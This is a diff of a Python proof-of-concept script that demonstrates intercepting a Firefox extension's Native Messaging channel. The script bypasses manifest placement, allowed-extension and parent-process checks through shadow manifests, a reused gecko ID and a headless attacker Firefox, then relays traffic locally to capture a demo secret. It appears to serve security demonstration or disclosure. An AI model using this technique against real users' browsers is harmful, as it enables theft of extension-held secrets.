@@ -59,8 +59,8 @@ def banner():
     print("  Native Messaging channel interception via 4-component relay")
     print("="*65)
 
-def defence(n, msg):
-    print(f"\n  Defence {n}: {msg}")
+def control(n, msg):
+    print(f"\n  Control {n}: {msg}")
 
 def step(n, title):
     print(f"\n  Step {n}: {title}")
@@ -324,13 +324,13 @@ def kill_geckodriver():
 def run_setup():
     banner()
 
-    print("\n  Defences in place:")
-    defence(1, "The NM manifest is installed at the system level "
-               "(/Library/Application Support/Mozilla/NativeMessagingHosts/) — "
+    print("\n  Controls in place:")
+    control(1, "The NM manifest is installed at the system level "
+               "(/Library/Application Support/Mozilla/NativeMessagingHosts/), "
                "root-owned, requires administrator privileges to modify.")
-    defence(2, "The manifest lists allowed_extensions — Firefox only forwards "
+    control(2, "The manifest lists allowed_extensions, Firefox only forwards "
                "connections from the specific victim extension ID to this host.")
-    defence(3, "The demo victim host verifies its parent process is Firefox "
+    control(3, "The demo victim host verifies its parent process is Firefox "
                "before responding to any request.")
 
     pause()
@@ -345,7 +345,7 @@ def run_setup():
         info("System-level manifest not found. Run install.sh first.")
         sys.exit(1)
 
-    bypass("Bypassing Defence 1: the user-level NM directory is always writable — "
+    bypass("Bypassing Control 1: the user-level NM directory is always writable, "
            "a same-named file there silently overrides the system-level entry.")
 
     pause()
@@ -359,14 +359,14 @@ def run_setup():
     info(f"allowed_extensions:  {sys_manifest['allowed_extensions']}")
     info("")
     info("Firefox extension IDs come from browser_specific_settings.gecko.id")
-    info("in the extension's manifest.json — a fixed, human-readable string.")
+    info("in the extension's manifest.json, a fixed, human-readable string.")
     info("No key derivation required.")
     info("")
     info(f"Gecko ID: {GECKO_ID}")
     info("")
     info("The passthrough extension must declare the same gecko ID.")
 
-    bypass("Bypassing Defence 2: passthrough extension declares the victim's gecko ID — "
+    bypass("Bypassing Control 2: passthrough extension declares the victim's gecko ID, "
            "same ID, allowed_extensions passes.")
 
     pause()
@@ -375,7 +375,7 @@ def run_setup():
     step(3, "Writing the _real NM manifest for attacker Firefox")
     info("The passthrough extension calls connectNative('com.demo.securevault_real')")
     info("to avoid the shadow manifest. We write that manifest to the user-level Mozilla path")
-    info("(Firefox ignores profile-dir NativeMessagingHosts/ — unlike Chrome):")
+    info("(Firefox ignores profile-dir NativeMessagingHosts/, unlike Chrome):")
     info("")
 
     real_path = write_real_manifest(real_host_path)
@@ -402,7 +402,7 @@ def run_setup():
     info("Firefox spawns the MITM wrapper (parent = victim Firefox) and the real host")
     info("(parent = attacker headless Firefox). Both parent checks pass, no spoofing.")
 
-    bypass("Bypassing Defence 3: both parents are genuine Firefox processes.")
+    bypass("Bypassing Control 3: both parents are genuine Firefox processes.")
 
     pause()
 
@@ -453,7 +453,7 @@ async def _relay_main():
     info(f"Relay upstream   (passthrough extension): ws://127.0.0.1:{WS_UPSTREAM}")
     info(f"Relay downstream (MITM wrapper)         : ws://127.0.0.1:{WS_DOWNSTREAM}")
 
-    bypass("Defence 3 satisfied: real host's parent is attacker headless Firefox.")
+    bypass("Control 3 satisfied: real host's parent is attacker headless Firefox.")
     bypass("Signature enforcement bypassed via profile user.js preferences.")
 
     srv_up = await websockets.serve(relay.handle_upstream, "127.0.0.1", WS_UPSTREAM)
@@ -503,12 +503,12 @@ async def _relay_main():
             await asyncio.sleep(2.0)
             info(f"  Waiting for passthrough extension to connect to relay...")
         else:
-            info(f"  WARNING: extension install failed — check geckodriver and Firefox.")
+            info(f"  WARNING: extension install failed, check geckodriver and Firefox.")
     else:
-        info(f"  WARNING: could not create Firefox session — check geckodriver.")
+        info(f"  WARNING: could not create Firefox session, check geckodriver.")
 
     # ── Step 6: Wait for victim ───────────────────────────────────────────────
-    step(6, "MITM is active — waiting for the victim")
+    step(6, "MITM is active, waiting for the victim")
     info("")
     info("  1. Open Firefox (your normal browser profile).")
     info("  2. Click the SecureVault extension popup -> Get Secret.")
